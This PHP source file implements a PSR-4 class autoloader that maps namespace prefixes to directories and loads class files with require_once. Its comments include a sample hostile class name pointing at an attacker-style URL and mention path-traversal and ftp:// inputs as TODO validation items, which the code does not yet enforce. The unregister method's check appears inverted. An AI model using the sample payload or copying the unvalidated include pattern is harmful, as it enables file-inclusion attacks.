<?php
	namespace Novae\Common;

// Todo  :: block namespaces that start with a period ( .hidden, ../../../passwd  ftp://foo )
// User code :    $className = "http://hackerwebserver.com/malicious\script"; new $className;
	class AutoLoadPSR4 {

		static private $isRegistered = FALSE;
		static private $prefixMap = [];

		/** Register the autoloader with PHP, optionally with a [[prefix => libDir]] map

		Calling register multiple times will not register the autoloader multiple times,
		instead, any new prefixes will be added to the existing autoloader, and then the
		register function will silently return (while remaining registered, with both
		the previous and new prefixes mapped).

		@param $prefixMap = [] // If provided, an array of key value pairs, where the key is a namespace prefix, and the value is the path to load classes for that prefix from
		*/
		static public function register($prefixMap)
		{
			self::addPrefix($prefixMap);

			if (self::$isRegistered) return;

			spl_autoload_register( [ get_called_class(), "autoLoadClass" ]);

			self::$isRegistered = TRUE;
		}


		/** Unregister this autoloader from PHP's autoloader callback queue */
		static public function unregister()
		{
			if (self::$isRegistered)
				return;

			spl_autoload_unregister( [ get_called_class(), "autoLoadClass" ]);
			self::$isRegistered = FALSE;
		}


		/** Register one or more namespace prefixes to the autoloader's namespace prefix => lib path map

		Registering a prefix in to the prefix map that is already registered, causes the path to be replaced for that prefix.

		@param $prefix [ string (namespace prefix) or arrayOf [$prefix (namespace prefix) => $path (path to load for said prefix)]
		@param $path=FALSE string (path for related prefix to load from); if FALSE, $prefix must take an array form

		@returns bool TRUE if all provided prefixes were added or replaced, FALSE if there was an error in the argument order
		*/
		static public function addPrefix($prefix, $path = FALSE)
		{
			if (is_array($prefix) && $path === FALSE)
			{
				$prefixMap = $prefix;
			}
			else if (!is_string($prefix) || $path === FALSE)
			{
				// ToDo: log a non-fatal error
				return FALSE;
			}
			else
				$prefixMap = [ $prefix => $path ];

			foreach ($prefixMap as $prefix => $path)
			{
				while ($prefix[0] == "\\") // standardize prefix form
					$prefix = substr($prefix, 1);

				// todo:   validate namespace prefix + path to not contain fopen wrappers (ftp://) and hidden characters (../../passwd)
				self::$prefixMap[$prefix] = $path;
			}

			return TRUE;
		}


		/** The callback for spl_autoload_register; this function takes a class name and includes the required library, if found

		@param @fullClassName A fully qualified class name

		@returns void
		*/
		public static function autoLoadClass( $fullClassName )
		{
			$file = self::findClassFileForClass( $fullClassName );
			if ($file !== FALSE)
				self::loadClassFile( $file );

			return;
		}

		/** Load a class file provided by path
		@param @path The class file to load

		@returns void
		*/
		public static function loadClassFile( $file )
		{
			if (!file_exists($file))
			{
				; // ToDo:  log error/warning etc when log system exists
				return;
			}
			else if (!is_readable($file))
			{
				;; // ToDo:  log error/warning etc, when log system exists
				return;
			}

			require_once($file);

			return;
		}

		/** Finds the file represented by a fully qualified class name, if possible

		@param $fullClassName As provided by the spl_autoload callback
		@returns string (existing file path) A file path that file_exists and is_readable
		*/
		public static function findClassFileForClass( $fullClassName )
		{
			while ($fullClassName[0] == "\\")
				$fullClassName = substr($fullClassName, 1);

			$nameArray = explode("\\", $fullClassName);
			$len = count($nameArray);
			$className = $nameArray[ $len - 1 ];
			$prefixPathsFound = []; // Store in here, paths to check, after finding all valid prefixes that match this fullClassName's prefix
			$prefixPathsFoundPrefixLength = 0; // How many namespace separators are in the prefix?    So that a more specific prefix always takes precedence over a less specific one.

			foreach(self::$prefixMap as $thisPrefix => $pathForPrefix)
			{
				$found = FALSE;
				$thisPrefixArray = explode("\\", $thisPrefix);

				$prefixLength = count($thisPrefixArray);
				if ($prefixLength < $prefixPathsFoundPrefixLength) // If we've already found a more specific prefix than this could represent, continue
					continue;

				$found = TRUE;
				foreach($thisPrefixArray as $currentPrefixIndex => $currentPrefix)
				{
					if ($nameArray[$currentPrefixIndex] != $currentPrefix)
					{
						$found = FALSE;
						break;
					}
				}

				if ($found)
				{
					$remainder = $nameArray;
					array_splice($remainder, 0, $currentPrefixIndex+1);

					if ($prefixLength > $prefixPathsFoundPrefixLength)
					{
						$prefixPathsFound = [];
						$prefixPathsFoundPrefixLength = $prefixLength;

					}

					$prefixPathsFound[$pathForPrefix] = $remainder;
				}
			}


			if (!$prefixPathsFound)
			{
	//			echo "WARNING::: ".$fullClassName." requested, prefix not located\n"; // Todo: revisit if a warning is needed here
				return;
			}

	//		echo "DEBUG BREAK::: ".$fullClassName." requested, found prefix paths: "; // Todo:  revisit when debug/trace logs are available
	//		var_export($prefixPathsFound);

			foreach($prefixPathsFound as $prefixDir => $remainderArray)
			{
				$testFile = $prefixDir . DIRECTORY_SEPARATOR . implode(DIRECTORY_SEPARATOR, $remainderArray) . ".php";
	//			echo " \nTest file location: ".$testFile. "\n"; // Todo: revisit when debug/trace logs are available
				if (!file_exists($testFile))
					continue;
				else if (!is_readable($testFile))
				{
					// Todo:  a warning or error log or exception should go here, when the logging system exists
					return FALSE; // intentionally not continue.   We found the file, but there's a permission error!
				}
				return $testFile;
			}


			return FALSE;
		}

	}
